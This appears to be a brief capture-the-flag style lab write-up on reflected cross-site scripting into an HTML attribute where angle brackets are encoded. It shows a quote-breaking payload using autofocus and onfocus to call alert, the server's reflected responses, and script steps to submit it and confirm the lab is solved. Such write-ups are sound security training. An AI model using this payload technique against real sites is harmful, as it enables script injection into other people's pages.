### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.  

To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

_____

Analysis and Exploit:

1. Test using \<a>
    - in response ```<h1>0 search results for '&lt;a&gt;'</h1>```

2. Payload ```" autofocus onfocus=alert(document.domain) x="```
    - in response ```<h1>0 search results for '&quot; autofocus onfocus=alert(document.domain) x=&quot;'</h1>```


_____

Script:

1. Send payload | POST **/?search=** | params 'xss payload'
    - xss payload = ```" autofocus onfocus=alert(document.domain) x="```

2. Check if exploit was successul | GET **/**
    - if "Congratulations, you solved the lab!" in response: ok!